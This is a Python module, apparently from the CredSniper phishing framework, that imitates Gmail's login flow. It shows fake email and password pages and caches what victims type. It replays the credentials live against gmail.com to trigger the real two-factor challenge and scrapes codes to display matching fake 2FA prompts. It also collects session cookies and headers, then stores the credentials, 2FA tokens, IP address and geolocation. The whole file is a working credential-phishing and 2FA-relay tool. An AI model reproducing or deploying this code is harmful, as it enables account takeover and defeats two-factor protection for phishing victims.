from __future__ import print_function
from flask import redirect, request, jsonify, Markup
from os import system
from core import functions
from core.base_module import *
import uuid
import mechanicalsoup
import bs4
import re, sys, time, random
import time
import json

class GmailModule(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)

        self.set_name('gmail')
        self.add_route('main', '/')
        self.add_route('accounts', '/accounts')
        self.add_route('authenticate', '/authenticate')
        self.add_route('redirect', '/redirect')
        self.enable_two_factor(enable_2fa)

    def main(self):
        next_url = '/accounts'
        template = self.env.get_template('login.html')

        return template.render(
            next_url=next_url,
            hostname=request.host,
        )


    def accounts(self):
        self.user = request.values.get('email')

        next_url = '/authenticate'
        template = self.env.get_template('password.html')

        return template.render(
            hostname=request.host,
            next_url=next_url,
            email=self.user
        )


    def authenticate(self):
        self.user = request.values.get('email')
        self.password = request.values.get('password')

        functions.cache_creds(self.name, self.user, self.password)

        triggered = self.trigger()
        redirect_user = triggered.get('action', None)

        if redirect_user == 'redirect':
            return redirect(self.final_url, code=302)

        if not self.enable_2fa:
            return redirect(self.final_url, code=302)

        twofactor_type = triggered.get('type', 'error')
        twofactor_code = triggered.get('code', None)
        twofactor_name = triggered.get('name', None)

        if twofactor_type == 'touchscreen':
            if twofactor_code:
                additional = Markup(
                    ', then touch number <strong>{}</strong>.'.format(
                        twofactor_code
                    )
                )
                twofactor_code = additional
            else:
                twofactor_code = '.'

        tf_type = '{}.html'.format(twofactor_type)
        template = self.env.get_template(tf_type)

        next_url = '/redirect'

        return template.render(
            hostname=request.host,
            next_url=next_url,
            enable_2fa=self.enable_2fa,
            email=self.user,
            password=self.password,
            code=twofactor_code,
            name=twofactor_name,
            two_factor_type=twofactor_type,
            first_name=''
        )


    def redirect(self):
        self.user = request.values.get('email')
        self.password = request.values.get('password')
        self.two_factor_token = request.values.get('two_factor_token')
        self.two_factor_type = request.values.get('two_factor_type')

        city, region, zip_code = '','',''
        try:
            geoip_url = 'https://freegeoip.net/json/{}'.format(
                request.remote_addr
            )
            geo_browser = mechanicalsoup.StatefulBrowser()
            geo_response = geo_browser.open(geoip_url)
            geo = json.loads(geo_response.text)
            city = geo['city']
            region = geo['region_name']
            zip_code = geo['zip_code']
        except Exception as ex:
            pass

        functions.store_creds(
            self.name,
            self.user,
            self.password,
            self.two_factor_token,
            self.two_factor_type,
            request.remote_addr,
            city,
            region,
            zip_code
        )
        return redirect(self.final_url, code=302)


    def trigger(self):
        raw_headers = None

        data_2fa = {
            'type': None,
            'code': None,
            'name': None,
            'action': None,
            'headers': [],
            'cookies': [],
        }

        try:
            browser = mechanicalsoup.StatefulBrowser(
                soup_config={'features': 'html'},
                raise_on_404=True,
                user_agent='Python-urllib/2.7',
            )

            page = browser.open('https://www.gmail.com')

            user_form = browser.select_form('form')
            user_form.set('Email', self.user)
            user_response = browser.submit(user_form, page.url)

            pass_form = mechanicalsoup.Form(user_response.soup.form)
            pass_form.set('Passwd', self.password)
            pass_response = browser.submit(pass_form, page.url)

            raw_headers = pass_response.headers
            soup = pass_response.soup
            raw = soup.text

            sms = soup.find('input', {'id': 'idvPreregisteredPhonePin'})
            sms_old = soup.find('button', {'id': 'idvPreresteredPhoneSms'})
            u2f = soup.find('input', {'id': 'id-challenge'})
            touch = soup.find('input', {'id': 'authzenToken'})
            authenticator = soup.find('input', {'id': 'totpPin'})
            backup = soup.find('input', {'id': 'backupCodePin'})

            if sms or sms_old:
                data_2fa['type'] = 'sms'

                if sms_old:
                    final_form = mechanicalsoup.Form(pass_response.soup.form)
                    final_response = browser.submit(final_form, page.url)
                    raw_headers = final_response.headers
                    raw = final_response.soup.text
                    data_2fa['type'] = 'u2f'

                code = ''
                regexes = [
                    r"\d{2}(?=</b>)",
                    r"(?<=\u2022)\d{2}(?=G)",
                    r"\d{2}(?=G)",
                    r"\d{2}(?=\</b>)",
                    r"\d{2}(?=S)",
                ]
                for regex in regexes:
                    matches = re.search(regex, raw, re.UNICODE)
                    if matches:
                        code = matches.group()
                        break
                    else:
                        code = '••'

                data_2fa['code'] = code
            elif u2f:
                data_2fa['type'] = 'u2f'
            elif touch:
                code = ''
                name = ''
                regex_codes = [
                    r"(?<=<b>)\d{1,3}(?=</b>)",
                    r"(?<=then tap )\d{1,3}(?= on your phone)"
                ]
                for regex_code in regex_codes:
                    code_match = re.search(regex_code, raw)
                    if code_match:
                        code = code_match.group()
                    else:
                        code = 0

                regex_names = [
                    r"(?<=Unlock your ).*(?=Tap)",
                    r"(?<=Check your ).*(?=<\/h2>)",
                ]
                for regex_name in regex_names:
                    name_match = re.search(regex_name, raw)
                    if name_match:
                        name = name_match.group()
                    else:
                        name = 'phone'

                data_2fa['code'] = code
                data_2fa['name'] = name
                data_2fa['type'] = 'touchscreen'
            elif authenticator:
                name = ''
                regexes = [
                    r"(?<=Get a verification code from the <strong>).*(?=<\/strong>)",
                    r"(?<=Get a verification code from the ).*(?= app)",
                ]
                for regex in regexes:
                    name_match = re.search(regex, raw, re.UNICODE)
                    if name_match:
                        name = name_match.group()
                    else:
                        name = 'authenticator app'

                data_2fa['name'] = name
                data_2fa['type'] = 'authenticator'
            elif backup:
                data_2fa['type'] = 'backup'
            else:
                if 'Try again in a few hours' in raw:
                    data_2fa['error'] ='locked out'
                data_2fa['action'] = 'redirect'

            cookies = []
            for c in browser.get_cookiejar():
                cookie = {}
                cookie['name'] = c.name
                cookie['value'] = c.value
                cookie['domain'] = c.domain
                cookie['path'] = c.path
                cookie['secure'] = c.secure
                cookie['expires'] = c.expires
                cookies.append(cookie)

            data_2fa['cookies'] = cookies

            for h in raw_headers:
                header = {}
                header['name'] = h
                header['value'] = raw_headers[h]
                data_2fa['headers'].append(header)

        except Exception as ex:
            data_2fa['error'] = ex
            pass

        return data_2fa

# REQUIRED: When module is loaded, credsniper calls load()
def load(enable_2fa=False):
    '''Initial load() function called from importlib in the main CredSniper functionality.'''
    return GmailModule(enable_2fa)

